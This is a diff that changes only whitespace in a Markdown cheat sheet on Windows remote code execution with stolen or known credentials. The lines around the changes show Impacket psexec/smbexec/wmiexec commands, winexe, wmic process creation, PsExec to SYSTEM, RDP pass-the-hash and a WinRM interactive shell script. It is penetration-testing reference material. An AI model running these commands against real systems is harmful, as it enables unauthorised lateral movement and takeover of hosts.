@@ -3,12 +3,12 @@
 ## Summary
 
 * [TIPS](#tips)
-    * [TIP 1 - Create your credential](#tip-1-create-your-credential)
-    * [TIP 2 - Retail Credential](#tip-2-retail-credential)
-    * [TIP 3 - Sandbox Credential - WDAGUtilityAccount](#tip-3-sandbox-credrential-wdagutilityaccount)
+  * [TIP 1 - Create your credential](#tip-1-create-your-credential)
+  * [TIP 2 - Retail Credential](#tip-2-retail-credential)
+  * [TIP 3 - Sandbox Credential - WDAGUtilityAccount](#tip-3-sandbox-credrential-wdagutilityaccount)
 * [Metasploit](#metasploit)
-    * [Metasploit - SMB](#metasploit-smb)
-    * [Metasploit - Psexec](#metasploit-psexec)
+  * [Metasploit - SMB](#metasploit-smb)
+  * [Metasploit - Psexec](#metasploit-psexec)
 * [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
 * [WinRM](#winrm)
 * [Powershell Remoting](#powershell-remoting)
@@ -40,7 +40,7 @@ net user /dom
 net user /domain
 ```
 
-### TIP 2 - Retail Credential 
+### TIP 2 - Retail Credential
 
 Retail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)
 
@@ -62,7 +62,6 @@ Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Wind
 Username: wdagutilityaccount
 Password: pw123
 ```
-
 
 ## Metasploit
 
@@ -114,6 +113,7 @@ PS C:\> Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami
 ## WinRM
 
 Require:
+
 * Port **5985** or **5986** open.
 * Default endpoint is **/wsman**
 
@@ -128,7 +128,7 @@ or using a custom ruby code to interact with the WinRM service.
 ```ruby
 require 'winrm'
 
-conn = WinRM::Connection.new( 
+conn = WinRM::Connection.new(
   endpoint: 'http://ip:5985/wsman',
   user: 'domain/user',
   password: 'password',
@@ -138,16 +138,15 @@ command=""
 conn.shell(:powershell) do |shell|
     until command == "exit\n" do
         print "PS > "
-        command = gets        
+        command = gets
         output = shell.run(command) do |stdout, stderr|
             STDOUT.print stdout
             STDERR.print stderr
         end
-    end    
+    end
     puts "Exiting with code #{output.exitcode}"
 end
 ```
-
 
 ## Powershell Remoting
 
@@ -171,8 +170,7 @@ PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
 PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
 ```
 
-
-## Winexe 
+## Winexe
 
 Integrated to Kali
 
@@ -186,7 +184,7 @@ root@payload$ winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
 PS C:\> wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
 ```
 
-## Psexec.py / Smbexec.py / Wmiexec.py 
+## Psexec.py / Smbexec.py / Wmiexec.py
 
 from Impacket
 
@@ -200,10 +198,10 @@ root@payload$ python psexec.py DOMAIN/username:password@10.10.10.10
 # A similar approach to PSEXEC w/o using RemComSvc
 root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10
 
-# A semi-interactive shell, used through Windows Management Instrumentation. 
+# A semi-interactive shell, used through Windows Management Instrumentation.
 root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10
 
-# A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. 
+# A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints.
 root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10
 
 # Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
@@ -218,10 +216,10 @@ from Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downl
 PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
 
 # switch admin user to NT Authority/System
-PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s 
+PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s
 ```
 
-## RDP Remote Desktop Protocol 
+## RDP Remote Desktop Protocol
 
 Abuse RDP protocol to execute commands remotely with [SharpRDP](https://github.com/0xthirteen/SharpRDP)
 
@@ -235,7 +233,7 @@ Or connect remotely with `rdesktop`
 root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
 root@payload$ rdesktop -u username -p password -g 70 -r disk:share=/tmp/myshare 10.10.10.10
 # -g : the screen will take up 70% of your actual screen size
-# -r disk:share : sharing a local folder during a remote desktop session 
+# -r disk:share : sharing a local folder during a remote desktop session
 ```
 
 Note: you may need to enable it with the following command
@@ -264,7 +262,7 @@ or with Metasploit
 root@payload$ run getgui -u admin -p 1234
 ```
 
-or with xfreerdp 
+or with xfreerdp
 
 ```powershell
 root@payload$ xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+
@@ -272,7 +270,7 @@ root@payload$ xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.1
 root@payload$ xfreerd /u:runner /v:10.0.0.1 # password will be asked
 ```
 
-## Netuse 
+## Netuse
 
 Windows only
 
@@ -280,13 +278,12 @@ Windows only
 PS C:\> net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
 ```
 
-## Runas 
+## Runas
 
 ```powershell
 PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
 PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
 ```
-
 
 ## References
 
